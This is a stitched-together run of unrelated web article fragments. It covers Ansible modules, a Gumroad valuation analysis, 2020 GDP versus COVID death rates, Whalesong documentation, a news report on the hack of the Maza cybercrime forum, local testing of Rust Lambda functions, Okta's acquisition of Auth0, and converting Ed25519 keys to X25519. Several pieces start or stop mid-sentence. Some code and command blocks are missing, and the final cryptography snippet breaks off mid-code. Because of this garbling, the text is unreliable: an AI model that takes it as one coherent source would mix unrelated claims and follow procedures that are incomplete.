module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/ping_module.html), targeting the `vpn` group of servers. You should see "pong" in the output, meaning that Ansible could connect to the server and the server has a Python installation that Ansible can use.</p><p># Ansible's Built-in Variables and Facts</p><p>There are other useful Ansible modules that we can use with the `ansible` command:</p><p>- The [setup module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/setup_module.html) fetches [system information, also known as "facts"](https://docs.ansible.com/ansible/latest/user_guide/playbooks_vars_facts.html), about the server. You can use these facts as variables in Ansible commands and playbooks.<br>- The [debug module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/debug_module.html) can evaluate variables, which is useful for... well, debugging!</p><p>Try running both of these modules with your server so you can see what facts and information Ansible makes available:</p><p>```bash<br>ansible -i inventory.ini -m setup vpn<br>ansible -i inventory.ini -m debug -a "var=hostvars" vpn<br>```</p><p>This was one of the most confusing parts for me when learning Ansible — figuring out what all these built-in variables and facts (like `groups`, `inventory_dir`, and `ansible_distribution`) were and how to find them.</p><p># Writing an Ansible Playbook</p><p>The `ansible` command lets you run [ad-hoc …</p></div></div>

Revenue grew slowly, just cracking $3M a year in 2018. Gumroad seemed destined to stay what VCs call a “lifestyle business” forever.</p><p>Then came 2020 and COVID-19. Gumroad’s gross merchandise value doubled from the previous year to $142M, while revenues nearly doubled to $9M on sales to nearly 600,000 customers. Only 180,000 people had made purchases on Gumroad in 2018, demonstrating that sometimes the key to building a big business is staying alive long enough.</p><p>What’s becoming clear today, as the creator economy explodes, is just how big and non-zero-sum that business could be.&nbsp;As the massive and fragmented creator ecosystem has begun rebundling, two distinct types of businesses have emerged: all-in-one "Apples" and interoperable "Androids".&nbsp;</p><p>The all-in-one platforms, like Apple products, index on end-to-end cohesion rather than integrating with other platforms. They allow creators to do their production, distribution, marketing and community management all in one place. </p><p>Gumroad, on the other hand, like Android, has focused on building for extensibility and interoperability, creating a checkout experience creators can use to sell digital goods to their fans no matter what other platforms and tools they want to use. </p><p>Rather than do everything, Gumroad has focused on doing one thing well. That's made Gumroad’s business relatively unsexy, but it also makes it resilient—along with Gumroad’s bootstrapper mentality, history of creator alignment, and low fees, it's helped them earned the trust of their creators. And that trust may buy Gumroad the time that they need to build the creator checkout of the future.</p><h2 id="key-points">Key points</h2><ul><li>Gumroad is an online checkout and product page for creators. The site began as a way to host and sell digital downloads but has recently expanded to memberships and physical items.</li><li>Gumroad will likely price itself at $100M pre-money in its March 2021 crowdfunding round. For Gumroad to produce a double-digit internal rate of return (IRR) for investors at this valuation, our model indicates Gumroad needs to grow about 40% per year for the next ten years through a combination of revenue growth and margin expansion.</li><li>Gumroad is popular with creators making under $10,000 per year because of their low, transaction fee-based costs for beginning creators and ease of setup and onboarding—above $10,000 per year, creators reach an equilibrium point where going to a vertical-specific SaaS platform can cost the same but provide more features.</li><li>COVID provided strong tailwinds to growth beginning in March 2020. Gumroad facilitated $142M GMV over the course of the year, up 94% from $73M in 2019. Their five-year GMV CAGR is 37%.  </li><li>In 2020, the company generated just over $9M in revenue. Revenue has been growing broadly in line with GMV, mainly due to its stable take rate of around 6.5%. That's significantly lower than other marketplaces like eBay (10%) and Cameo (25%). </li><li>Gumroad's gross margin increased from 20% in 2016 to 35% in 2020. Gumroad became profitable in 2017.&nbsp;</li><li>Gumroad has low switching costs. That said, Gumroad has a strongly creator-aligned brand and a strong rate of adoption with new, beginning, and lower-income creators.</li><li>Gumroad has built a company that does one thing well—product pages and checkout—while companies like Teachable, Kajabi and Podia have built all-in-one platforms to enable creators with their marketing, communication, content and distribution.</li><li>By serving the 'head' of the creator ecosystem, these kinds of all-in-one platforms can drive higher ARPU and LTV. The low-income and beginner creators that Gumroad is focused on serving, meanwhile, have been externally benchmarked churning at rates as high as 20% per month. </li><li>Ultimately, however, Gumroad's creator-alignment and tight focus on checkout may be to its advantage. By indexing on interoperability and leveraging their marketplace's scale like Shopify did, Gumroad has the opportunity to build the dominant checkout platform for the creator economy.</li><li>In our bear case, high churn cuts into Gumroad’s primary customer base and the company also loses higher-income creators to more fully-featured platforms. In our bull case, Gumroad becomes a $1B company and a core platform of the creator economy.</li></ul><h2 id="valuation--how-gumroad-can-justify-its--100m-price-tag">Valuation: How Gumroad can justify its $100M price tag</h2><p>Gumroad will likely price itself at $100M pre-money in its March 2021 crowdfunding round.

		<div>
			
<p>Last year was a historically bad year for many reasons, but to economists that badness is most visible in our widest measure of the economy: Gross Domestic Product. All issues with GDP aside, especially as a perfect measure of relative living standards, the annual real (inflation-adjusted) growth rate of GDP gives us a good picture of how much national economies were harmed by the pandemic, private behavior changes, and government restrictions (disentangling these three effects is hard — I will leave that to the academic journals rather than a blog post).</p>



<p>While GDP is reported with a lag of several months and is subject to revision, many countries have now reported full GDP data for 2020. For those that don’t follow GDP very closely, for a developed country an annual rate of growth of about 2% is pretty normal and respectable. For further context, in the US recent recessions had declines of -2.5% in 2009, -0.1% 1991, and -1.8% in 1982 (the 2001 recession never had an annual decline, only a few quarterly declines). While it is unusual for countries to go more than 10 years without a decline, it does happen. For example, Australia’s last annual decline was in 1991, when it declined -1.3%. But that’s unusual.</p>



<p>This chart shows the 2020 GDP growth rates (mostly negative, with one exception — Taiwan) for 2020 for most countries were I could find data. What this number shows us is the total amount of economic activity in 2020 compared with the total amount of economic activity in 2019 (adjusted for inflation, of course). I believe this is a better measure than others you might see, such as data that compares the level in the 4th quarters of 2020 and 2019 (a country could have had a terrible 2nd quarter but still gotten back close to the prior year level, and a simple Q-over-Q measure would miss that decline). As I did for the <a href="https://economistwritingeveryday.com/2020/11/18/third-quarter-check-in-covid-and-gdp/" target="_blank" rel="noreferrer noopener">3rd quarter data</a>, this chart also plots the cumulative COVID-19 death rates on the vertical axis.</p>

COVID-19 death data is from Our World in Data.</em></figcaption></figure>



<p>What can we learn from this data?</p>



<p>First of all, I would caution any suggestions about causation between these two numbers. The both reflect the same basic fact: how hard a country was hit by the pandemic. A country like Australia or Taiwan that performed well on both economic and health measures got these outcomes for the same reason: the weren’t hit hard by the pandemic. I will leave aside in this post questions about how much of this is due to government policy and how much of that policy could have been replicated in other countries. But Australia, Taiwan, and South Korea were, for a variety of reasons, able to avoid being hit hard by the pandemic.</p>



<p>Here is one thing that jumps out at me from the data: there are a large number of countries that had GDP declines between -2% and -4%, a level that is certainly bad but is not outside the range of a “normal” recession. But within this band of -2% to -4%, total COVID deaths range tremendously, from just 135 deaths per million people in Finland to over 1500 deaths per million in the US, or over 10 times as many. Notably also Sweden is almost 10 times Finland’s death rate and over 3 times Denmark’s death rate.</p>



<p>Could Sweden have looked more like Denmark and Finland with slightly different policies? Could the US? These questions have already been debated endlessly, and I suspect they will continue to be debated. It’s a question that is really hard to ever answer definitively, but it is worth asking.</p>



<p>Another pattern I notice is that many major Western European countries nicely fit on a line that extends from the worst outcome in the UK down through Italy, France, Germany, Denmark, and finally the best outcome in Norway. Among the largest European nations, only Spain does not fit perfectly on this line, though they are close. Once again, don’t infer too much about causation. For a variety of reasons that we don’t fully understand right now (and maybe never will, but science will try) the United Kingdom was hit especially hard. Both their economy and their health suffered considerably.</p>



<p>Could the UK, with fewer government restrictions, have ended up in a similar position to Belgium and Czechia? Those two countries also were hit extremely hard by the pandemic, but Czechia’s GDP decline was at least only half as bad as the UK. Or, without the government restrictions, would deaths have been even higher in the UK? That might seem unfathomable, but it is not. Right now 13 states in the US, with a combined population of 80 million people, have higher COVID death tolls than the UK, in some cases dramatically more (such as New Jersey, which is 45% higher than the UK).</p>



<p>We probably don’t need to say this again, but I will: 2020 was a really bad year. We are now starting to get a complete picture of just how bad it was. The variation across countries, and in some cases within countries or <a rel="noreferrer noopener" href="https://twitter.com/jmhorp/status/1366984212818059265" target="_blank">even with large US states</a>, is so large that social scientists will continue to study this issue for years to try and learn more about the causes. But let’s be cautious about quick analyses posted online now which claim they have identified the cause, or that there was no cause, only bad luck or demographic factors. Causation is a tricky thing to figure out.</p>

programs and translates them so that they can run stand-alone on a
user’s web browser.  It should allow Racket programs to run with
(hopefully!) little modification, and provide access through the
foreign-function interface to native JavaScript APIs.  The included
runtime library supports the numeric tower, an image library, and a
framework to program the web in functional event-driven style.</p><p>The GitHub source repository to Whalesong can be found at
<a href="https://github.com/dyoo/whalesong"><span>https://github.com/dyoo/whalesong</span></a>.  If you have any questions or
comments, please feel free to use the
<a href="http://lists.racket-lang.org/users/">Racket-users</a> mailing
list.</p><p>Prerequisites: at least <a href="http://racket-lang.org/">Racket
5.1.1</a>.  If you wish to use the JavaScript compression option,
 you will need <a href="http://www.java.com/">Java 1.6</a> SDK.</p><h4>1.1<tt>&nbsp;</tt><a name="(part._.Examples)"></a>Examples</h4><p>Here are a collection of programs that use the <span>web-world</span> library described

Whalesong from fully compiling.</p><p>If you want to use Whalesong, run the following to create
the <span>"whalesong"</span> launcher:
</p><p>This may take a few minutes, as Racket is compiling Whalesong, its
dependencies, and its documentation.  When it finally finishes,
you should see a <span>"whalesong"</span> launcher in the current
directory.</p><p>You should also see a <span>"whalesong-gui"</span> launcher that includes
a minimal graphical user interface.</p><p>At this point, you should be able to run the <span>"whalesong"</span> executable from the command line.

translating Racket to JavaScript.  It can be run in several modes:</p><ul><li><p>To create HTML + js documents</p></li><li><p>To output the compiled JavaScript as a single <span>".js"</span> file</p></li></ul><p>Using <span>whalesong</span> to generate HTML+js documents is
relatively straightforward with the <span>build</span> command.  To use it,
pass the name of the file to it:
</p><div><div><p><span><span>$ whalesong build [name-of-racket-file]</span></span></p></div></div><p>A <span>".html"</span> and <span>".js"</span> will be written to the current directory, as will any external resources that the program uses.</p><p>The <span>whalesong</span> commands support these command line options:</p><ul><li><p> Use Google Closure’s JavaScript
compiler to significantly compress the JavaScript.  Using this
currently requires a Java 1.6 JDK.</p></li><li><p> Write verbose debugging information to standard error.</p></li><li><p>  Write files to a separate directory, rather than the current directory.</p></li><li><p> Write each dependent module as a
separate file, rather than in one large <span>".js"</span>.  This may be
necessary if your browser environment prohibits large <span>".js"</span>
files.  The files will be numbered starting from <span>1</span>.</p></li></ul><p>For more advanced users, <span>whalesong</span> can be used to generate
JavaScript in non-standalone mode.  This gives the web developer more
fine-grained control over how to control and deploy the outputted
program.</p><h4>3.1<tt>&nbsp;</tt><a name="(part._build)"></a><span>build</span></h4><p>Given the name of a program, this builds
<span>".html"</span> and <span>".js"</span> files into the current working directory.</p><p>The <span>".html"</span> and <span>".js"</span> should be self-contained, with an exception: if
the file uses any external <a href="#(tech._resource)" pltdoc="x"><span>resource</span></a>s by using
<span><a href="#(form._((planet._resource..rkt._(dyoo._whalesong..plt._1._18))._define-resource))" pltdoc="x">define-resource</a></span>, those resources are written into the current
working directory, if they do not already exist there.</p><h4>3.2<tt>&nbsp;</tt><a name="(part._get-javascript)"></a><span>get-javascript</span></h4><p>Given the name of a program, writes the JavaScript to standard output,
as well as its dependent modules.  The outputted file is meant to be
used as a <span>SCRIPT</span> source.</p><p>By default, the given program will be treated as a <span>main</span> module.
All main modules will be executed when the JavaScript function
<span>plt.runtime.invokeMains()</span> is called.</p><h4>3.3<tt>&nbsp;</tt><a name="(part._get-runtime)"></a><span>get-runtime</span></h4><p>Prints out the core runtime library that the files generated by
get-javascript depend on.</p><h3>4<tt>&nbsp;</tt><a name="(part._.Including_external_resources)"></a><a name="(mod-path._(planet._dyoo/whalesong~3a1~3a~3d18/resource))"></a>Including external resources</h3><p>Programs may need to use external file <a name="(tech._resource)"></a><span>resource</span>s that aren’t
themselves Racket programs, but instead some other kind of data.
Graphical programs will often use <span>".png"</span>s, and web-related
programs <span>".html"</span>s, for example.  Whalesong provides the
<span>(</span><span><a href="http://docs.racket-lang.org/reference/require.html#(form._((lib._racket%2Fprivate%2Fbase..rkt)._planet))" pltdoc="x">planet</a></span><span> </span><span>dyoo/whalesong:1:=18/resource</span><span>)</span> library to refer and use these
external resources.  When Whalesong compiles a program into a package,
these resources will be bundled alongside the JavaScript-compiled
output.</p><p>Defines a <a href="#(tech._resource)" pltdoc="x"><span>resource</span></a> with the given path name.</p><p>For example,
</p><p>As a convenience, you can also write
</p><p>which defines a variable named <span>humpback.png</span> whose
<a href="#(tech._resource)" pltdoc="x"><span>resource</span></a> is <span>"humpback.png"</span>.</p><p>If the resource given has an extension one of the following:

<p>A hacker has breached Maza Faka, one of the oldest underground cybercrime forums active today, shut down its Tor-based website, and leaked the details of around 3,000 users in a PDF file posted on the forum’s front page.</p>



<p>The security breach, which took place yesterday, on March 3, 2021, resulted in the leak of sensitive details about the forum’s registered users.</p>



<p>According to a copy of the leaked PDF file obtained by <em>The Record</em>, details such as usernames, emails, account passwords, and social media IDs (ICQ, Skype, AIM, MSN, and Yahoo) were posted online.</p>



<p>Additionally, the PDF file also contained information about each user’s certificate file and certificate password, which the Maza forum was using as a form of a two-step verification process.</p>



<figure><img loading="lazy" width="1000" height="940" src="https://www-therecord.recfut.com/wp-content/uploads/2021/03/Maza-hacked.png" alt="" srcset="https://therecord.media/wp-content/uploads/2021/03/Maza-hacked.png 1000w, https://therecord.media/wp-content/uploads/2021/03/Maza-hacked-300x282.png 300w, https://therecord.media/wp-content/uploads/2021/03/Maza-hacked-768x722.png 768w" sizes="(max-width: 1000px) 100vw, 1000px"></figure>



<p>But while the Maza leak is small in size compared to other data breaches this year, it is likely one of the most important security incidents of 2021, as it has led to the broad exposure of data that may aid law enforcement agencies in tracking down former or current cybercriminals.</p>



<p>Dmitry Smilyanets, a threat intelligence analyst at <a href="https://www.recordedfuture.com/">Recorded Future</a> who helped <em>The Record</em> analyze the Maza data, said the PDF file contains authentic information, which he was able to use to link several Maza users to public social media profiles.</p>

<h2><strong>End of the “forum era”</strong></h2>



<p>Threat intelligence firm Flashpoint, which also spotted the Maza hack earlier today, said in a <a href="https://www.flashpoint-intel.com/blog/breelite-cybercrime-forum-maza-breached-by-unknown-attacker/">blog post</a> that multiple members of the underground cybercrime community are now discussing moving away from using emails as a means to register profiles, as these can be easily tracked back to their real-world identities.</p>



<p>Furthermore, Smilyanets told <em>The Record</em> that in Telegram channels, several respectable threat actors are now calling for an end to the “forum era.”</p>



<p>These calls come after several major underground forums had suffered similar security breaches over the past few months. This includes:</p>



<ul><li><strong>Joker’s Stash</strong> – has <a href="https://www.zdnet.com/article/jokers-stash-the-internets-largest-carding-forum-is-shutting-down/">recently shut down</a> after the FBI and Interpol <a href="https://www.zdnet.com/article/fbi-interpol-disrupt-jokers-stash-the-internets-largest-carding-marketplace/">seized four of its proxy servers</a> in December 2020.</li><li><strong>Verified </strong>– was temporarily <a href="https://www.flashpoint-intel.com/blog/new-mysterious-operators-usurp-elite-russian-hacker-forum-verified/">hacked and shut down</a> after hackers tricked the forum’s domain registrar into handing over control over the site’s domain to a threat actor.</li><li><strong>Exploit </strong>– suffered a security breach this week after hackers <a href="https://krebsonsecurity.com/2021/03/three-top-russian-cybercrime-forums-hacked/">hijacked one of its DDoS mitigation solutions</a>.</li></ul>



<p>But among all these, Maza stands head and shoulders above the others, mainly due to the severity of its breach but also due to its long-standing reputation in the Russian-speaking cybercrime underground.</p>



<h2><strong>One of the most reputable cybercrime forums today</strong></h2>



<p>While unknown to the general reader, the Maza Faka forum is one of the oldest, if not the oldest, cybercrime portals active today.</p>



<p>The forum, which launched way back in 2003, has served for almost two decades as a place to trade stolen card details (an activity called “carding”), but also functioned as a marketplace to advertise other services like e-commerce fraud, bank fraud, and cash-out services.</p>



<p>Access to the forum has always been limited to a selected few.</p>



<p>“Registering on the forum requires a significant upfront fee, as well as several vouchers from current members who are in good standing on the forum and become financially responsible for the invited person in the case of disputes,” Smilyanets told <em>The Record</em>.</p>



<p>“Primarily attributed to such a strict registration policy, monetary disputes are rare compared with most other forums. As a result, only senior and established members of the hacking underworld are capable of gaining access.”</p>



<p>But, according to a Recorded Future threat intel bulletin, the forum’s activity has waned in recent years, and new card breaches or POS malware strains were rarely posted on the site anymore.</p>



<p>Today, the Maza forum primarily serves as a reputation index for the top dogs of the cybercrime underground, many of whom use their Maza profiles to vouch for their reputations.</p>



<p>As a result, any information on Maza users leaked this week might help uncover years-worth of cybercrime campaigns and some of the oldest and long-standing threat actors today.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>In the system I'm building there are a significant amount of SQS messages that need to be processed asynchronously and Lambda is a really good fit for that. It is perfect for spiky workloads. You can control max parallelism easily. And it now has a native integration where Lambda functions are invoked with pending SQS messages without any extra work on your part.</p>
<p>Lambda's great. I think it's time to declare it boring. In the "choose boring technology" sense. As in it's a robust and well-worn solution.</p>
<p>But a significant problem I had was that most of my code is Rust. The Lambda experience with the major languages (e.g. Python) is categorically better. There are fewer gotchas, many more examples, and it seems especially true when trying to use the higher level tooling out there which I will get into in a minute.</p>
<p>Re-writing the pieces in another language like Python was not tempting as these Lambda functions are handling all the same data structures, re-using business logic, and calling the same dependencies as the main code base. It could be done, of course. But having multiple pieces of code doing the same things can be a giant hassle/waste (for small teams especially). And Rust is just far more maintainable to me.</p>
<p>Those reasons to stick with Rust outweighed any deployment inconveniences or performance arguments. </p>
<p>Performance-wise, Rust is surely faster than my main other candidate Python. So, maybe I'd pay significantly less money in the long run? Especially now that Lambda is billing at 1ms increments? I love that this happened but it's not really a significant factor in this case. The actual processing time is dominated by calling SQS, gRPC services, and/or DynamoDB.</p>
<p>Cost decisions all depend on the use case and expected load, of course, but the difference I projected is a not significant problem to me in the real dollars it would translate to. Something like Python would be completely fine here. I projected it would only increase the 30-40ms average runtime by around 10%. Waiting around is pretty efficient in any language. The great news recently was Lambda moving from 100ms billing increments to 1ms: a boon here regardless of the programming language. Very cool.</p>
<p>On a related note, I'm about to create something with Cloudflare Workers (using Rust/wasm) and that's quite a different billing model. Unlike Lambda, if you're awaiting subrequests, it doesn't actively count against your CPU time for that invocation. Sweet. It comes with trade-offs, of course. I'll probably write about what I learn in the future. I bet I'm adopting it for the directly customer-facing layer as my experiments so far on that platform have been pretty positive.</p>
<p>For Lambda and Rust, I ended up trying a number of the higher level frameworks and tools. The biggest factors in the decision were the deployment and testing support. I don't mind some setup pain if there are safe deployment mechanisms and fast, local testing that very closely approximates the real environment.</p>
<p><a href="https://www.serverless.com/">Serverless</a> and <a href="https://aws.amazon.com/serverless/sam/">AWS SAM</a> are the two big ones that work with Rust and provide some local testing capability. There are a lot of other Python-centric ones. If you take local/mock testing out of the requirements, there are also some good infrastructure-as-code options: I'm eventually going to investigate CDK, Terraform, and Pulumi (which I use elsewhere). I have limited time and can't research a comprehensive survey of all of the options, unfortunately. I wish I could.</p>
<p>Fast iteration while developing is really important to me but none of those frameworks were fast for testing. The CLIs themselves take multiple seconds to respond for even simple tasks. Once Rust is involved, you're now into cross-compiling (to <a href="https://doc.rust-lang.org/edition-guide/rust-2018/platform-and-target-support/musl-support-for-fully-static-binaries.html">musl</a>) and on top of that delay the frameworks are building/using Docker containers behind the scenes to run the tests. For a week or so, I was just running the lambci Docker image directly in automated integration tests, but that was not cutting it either. Still all too slow, the cross-compilation especially.</p>
<p>I ended up eschewing the frameworks altogether for local testing which is what I mainly want to write about.</p>
<p>There's now a thin layer that intakes SQS messages and parses the JSON payload into a strongly typed Rust data structure. This is in the <code>bootstrap</code> binary that Lambda runs. It reads environment variables for configuration. Locally, there's a completely separate binary that reads configurations from a dynamically generated file and polls for messages from a Redis queue (using LPOP/BLPOP). In both cases, the parsed queue payload is pushed into the 'real' code base which is identical in both cases. A classic "shim":</p>
<p><img src="https://www.peakscale.com/serverless-rust.png"></p><p>It's worked out well. I folded it into the same test framework that I wrote for traditional services. Redis is just another process that is launched from a group blueprint. The framework can launch groups of arbitrary binaries (either my own artifacts or system binaries like Redis) and Docker containers. Unique ports are reserved on the fly (via a SQLite database that is unique to each node) and written into the dynamically created configuration files. The processes can discover each other by role name so that you don't have to test one process at a time and mock dependencies - they can work together just as they would in the real system. The integration test itself can look up the same configurations and feed the test messages into Redis.</p>
<p>Importantly, many groups can be launched simultaneously, i.e., each integration test can launch its own group of processes. I can have hundreds of these running thousands of Unix processes even on my laptop. The Unix process model works quite well. Use it!</p>
<p>And that means cross-compiling to musl only happens for real deployments to Lambda. Anything I'm in the middle of coding is incrementally compiled and local (either OSX or Linux). The tests can be run nearly instantly. Both Redis and Rust binaries are extremely fast to execute and get to an operational state. The actual process wrangling is handled by the extremely fast <a href="http://smarden.org/runit/">runit</a> set of tools which the group management code triggers. No more waiting on those Lambda testing framework's slow local testing or, worse, actually deploying to Lambda to get basic iterative feedback.</p>
<p>It's just unacceptable to me to wait more than a few seconds. Anything that requires more time tends to mean you get sucked into some distraction. When I'm coding I want to stay in the flow of it. Getting instant feedback from testing is awesome. Getting instant feedback from tests that are running exactly the same thing as production? That is just perfect. Unfortunately in this case, unlike my web services, it required faking something out (substituting Redis in for SQS) but I think it's low risk.</p>
<p>Even so, before final deployment I still choose to run the test suite against something with almost exact parity as production (basically only differing from production in stored database data). There could always be some difference. On teams I've been on, we've caught a few problems in those stages.</p>
<p>I also believe in the 'testing in production' ideas out there, to an extent. As long as we're not talking about <em>only</em> testing in production which usually makes no sense. There are still a number of problems you can catch ahead of time with a stage right before production that matches the infrastructure. In my case it's going to add around 10 minutes per actual deployment and I'm just fine with that given that it's automated and the potential value from avoiding an outage. But everyone has their own trade-offs to think about (<a href="https://www.peakscale.com/context/">context</a> matters).</p>
<p>Meanwhile both my local development flow and the longer full integration test suite were both sped up massively.</p>

              <p>This week, <a href="https://auth0.com/">Auth0</a> was acquired by <a href="https://www.okta.com/">Okta</a>, the largest company in the Identity &amp; Access Management space. &nbsp;After being founded in only 2014 and sold for a cool $6.5 billion, this is yet another example of how technology is increasingly being adopted by developers and finding it's way into the business in a bottom-up fashion.</p><h2 id="what-is-identity-access-management">What Is Identity &amp; Access Management?</h2><p>Many of the applications which you use or develop will be protected with username and password access. &nbsp;The username represents your individual <em>identity,</em> which will control how you are allowed to use the system and the data that you have access too, and the password of course controls your access to that identity.</p><p>It may seem that developing a username and password function is simple, but in reality there is a lot of effort and complexity to this. &nbsp;Not only do you need to implement the login feature, but also the logouts, password resets, multi-factor authentication, social logins and the ability to disable users to name just a few. Being authentication related, all of this needs to be developed securely, which is a skill in itself.</p><p>At an enterprise level, businesses also need to control access across an entire portfolio of applications, ensuring that the right people in the right job roles have access to the right systems. &nbsp;Technically, this will often mean that we need to develop integration between applications, internal directories and single sign on systems so that these things can be controlled and audited centrally. &nbsp;This is further development which needs to take place, none of which really adds value to your users.</p><p>Whilst implementing Identity &amp; Access Management does require lots of work and complexity, it is a task which overlaps greatly from application to application and organisation to organisation. &nbsp;Therefore, there have been a number of solutions developed which provide this through either on premise software deployment or more recently as a service.</p><p>Example products in this space include <a href="https://www.pingidentity.com/">Ping Identity</a> and <a href="https://www.okta.com/">Okta</a>. &nbsp;Both of these products and organisations started life and still punch hardest in the enterprise space, where the task is to protect thousands of applications and tens of thousands of users in a secure, controlled and compliant way. &nbsp;And historically they have done a good job at this, jointly protecting billions of user accounts.</p><h2 id="the-auth0-approach">The Auth0 Approach</h2><p>Rather than focus directly on enterprise, the Auth0 approach and their ultimate success was very much to focus on winning developer mindshare with a bottom-up adoption and sale.</p><p>Auth0 allows developers to drop in the identity and access management features directly into their applications, avoiding all of the development work whilst ensuring a secure implementation. &nbsp;The experience for developers is very good, and the frontend highly customisable so that security can be implemented without restricting their user experience. &nbsp;All of the documentation, guides and presentation are also oriented towards developers, and the business is very culturally aligned and tuned into the development community.</p><p>For all of these reasons, developers have flocked to Auth0 as their preferred solution for Identity &amp; Access Management.</p><p>In addition, whereas the competition are very enterprise focussed in their approach, Auth0 is much more consumer focussed. &nbsp;For instance, rather than being the technology by which enterprises secure their internal line of business applications, Auth0 has historically more naturally been at home when used in websites and mobile applications aimed at consumers. &nbsp;</p><p>Ultimately, Okta have concluded that these are both trends they need to buy into in todays developer led and digital world. &nbsp;</p><h2 id="what-can-we-learn-from-this">What Can We Learn From This?</h2><p>As technology leaders, the success and rapid adoption of Auth0 shows how new technology is increasingly entering the organisation through developers, who are consuming SaaS services and baking them into their applications. &nbsp;Of course this brings risk and governance considerations, but also shows how companies need to change to allow and support this innovation if they are to remain competitive. </p><p>The success of Auth0 also shows how enterprise IT is being turned inside out, taking previously internal line of business applications and data, and exposing this outside of the business so users and consumers can interact with it through digital channels. &nbsp;This is the flip side of consumerisation of enterprise IT, where we are taking enterprise IT and enabling it for direct use by customers. </p><p>Finally, this is of course another example of the rapid digitisation of the world economy, where companies are building more web and mobile applications. Intelligent consumption of developer accelerators and SaaS services like Auth0 is really necessary to get to market quickly and remain competitive. &nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <!--kg-card-begin: markdown--><p><a href="https://twitter.com/Benjojo12">@Benjojo12</a> and I are building <a href="https://docs.google.com/document/d/11yHom20CrsuX8KQJXBBw04s80Unjv8zCg_A7sPAX_9Y">an encryption tool</a> that will also support SSH keys as recipients, because everyone effectively already publishes their SSH public keys <a href="https://github.com/FiloSottile.keys">on GitHub</a>.</p>
<p>For <a href="https://tools.ietf.org/html/rfc8332">RSA keys</a>, this is <a href="https://eprint.iacr.org/2011/615.pdf">dangerous</a> but straightforward: a PKCS#1 v1.5 signing key is the same as an OAEP encryption key.</p>
<p><a href="https://tools.ietf.org/html/draft-ietf-curdle-ssh-ed25519-ed448-08#section-4">Ed25519 keys</a>, though, are specifically made to be used with <a href="https://tools.ietf.org/html/rfc8032">EdDSA, the Edwards-Curve Digital Signature Algorithm</a>. To encrypt to them we'll have to choose between converting them to X25519 keys to do Ephemeral-Static Diffie-Hellman, and devising our own Diffie-Hellman scheme that uses Ed25519 keys.</p>
<p>While the latter is a totally viable strategy—you can do Ephemeral-Static Diffie-Hellman on twisted Edwards curves—I wanted to reuse the X25519 codepath, so I opted for the former.</p>
<p>First, we need to understand the difference between Ed25519 and X25519. For that I recommend <a href="https://eprint.iacr.org/2017/212.pdf"><em>Montgomery curves and their arithmetic</em></a> by Craig Costello and Benjamin Smith, which is where I learned most of the underlying mechanics of Montgomery curves. The high level summary is that <strong>the twisted Edwards curve used by Ed25519 and the Montgomery curve used by X25519 are <em>birationally equivalent</em></strong>: you can convert points from one to the other, and they behave the same way. The main difference is that on Montgomery curves you can use the Montgomery ladder to do scalar multiplication of x coordinates, which is fast, constant time, and sufficient for Diffie-Hellman. Points on the Edwards curve are usually referred to as <code>(x, y)</code>, while points on the Montgomery curve are usually referred to as <code>(u, v)</code>.</p>
<p>RFC 7748 conveniently <a href="https://tools.ietf.org/html/rfc7748#page-5">provides</a> the formulas to map <code>(x, y)</code> Ed25519 Edwards points to <code>(u, v)</code> Curve25519 Montgomery points and vice versa.</p>
<pre><code>(u, v) = ((1+y)/(1-y), sqrt(-486664)*u/x)
(x, y) = (sqrt(-486664)*u/v, (u-1)/(u+1))
</code></pre>
<p>So that's what a <a href="https://tools.ietf.org/html/rfc7748#section-5">X25519 public key</a> is: a u coordinate on the Curve25519 Montgomery curve obtained by multiplying the basepoint by a secret scalar, which is the private key. An <a href="https://tools.ietf.org/html/rfc8032#section-5.1.5">Ed25519 public key</a> instead is the compressed encoding of a <code>(x, y)</code> point on the Ed25519 Edwards curve obtained by multiplying the basepoint by a secret scalar derived from the private key. (An Ed25519 private key is hashed to obtained two secrets, the first is the secret scalar, the other is used elsewhere in the signature scheme.)</p>
<p>If we use the same secret scalar to calculate both an Ed25519 and an X25519 public key, we will get two points that are birationally equivalent, so we can convert from one to the other with the maps above. There is one catch though: you might have noticed that <strong>while we have both x and y coordinates for the Ed25519 public key, we only have the u coordinate for the X25519 key</strong>. That's because u coordinates are enough to do Diffie-Hellman (which is the core insight of Curve25519).</p>
<p>For every valid u coordinate, there are two points on the Montgomery curve. The same is true of y coordinates and the Edwards curve. (When you use the birational map, y coordinates map to u coordinates and vice-versa.) That's why we can encode Ed25519 public keys as a y coordinate and a "sign" bit in place of the full x coordinate.</p>
<p>This means that for each X25519 public key, there are two possible secret scalars (<code>k</code> and <code>-k</code>) and two equivalent Ed25519 public keys (with sign bit 0 and 1, also said to be one the negative of the other).</p>
<p>By the way, this all works because the basepoints of the Montgomery and Edwards curves are equivalent. Interestingly enough, the spec made a mistake and picked the wrong v coordinate for the Montgomery basepoint, so that the Montgomery basepoint maps to the negative of the Edwards basepoint. <a href="https://www.rfc-editor.org/errata/eid4730">It's fixed in an errata</a> but no one cares about Montgomery v coordinates anyway.</p>
<p>It should be mentioned that there is precedent for converting keys between the two curves: <a href="https://signal.org/docs/specifications/xeddsa/">Signal's XEd25519</a>. They do the opposite of what we want to do though, they use an X25519 key for EdDSA. That comes with an issue: an X25519 public key does not carry a v coordinate, so it can map to two Ed25519 keys. They solve it by defining the Edwards point sign bit to be 0, and then negating the Edwards secret scalar if it would generate a point with positive sign. (It also comes with more issues due to not having the other secret that you derive from an EdDSA private key, but that's out of scope. I like the diagram in <a href="https://blog.mozilla.org/warner/2011/11/29/ed25519-keys/">this blog post</a> if you are curious.)</p>
<p>I recommend reading both <a href="https://signal.org/docs/specifications/xeddsa/#elliptic-curve-conversions">section 2.3 of the XEdDSA spec</a> and <a href="https://crypto.stackexchange.com/a/62881/6740">this StackExchange answer</a> if things don't feel clear at this point.</p>
<p>Getting back to our use case, it turns out that it's pretty easy to use an Ed25519 public key for X25519, because <strong>an Ed25519 public key maps to a single X25519 public key</strong>, and the Ed25519 secret scalar will be one of the two valid X25519 private keys for that public key.</p>
<p>To encrypt, we take the y coordinate of the Ed25519 public key and we convert it to a Montgomery u coordinate, which we use as an <a href="https://tools.ietf.org/html/rfc7748#section-5">X25519</a> public key for Ephemeral-Static Diffie-Hellman.</p>
<pre><code>u = (1 + y) / (1 - y)

ephemeral_secret = read(/dev/urandom, 32)
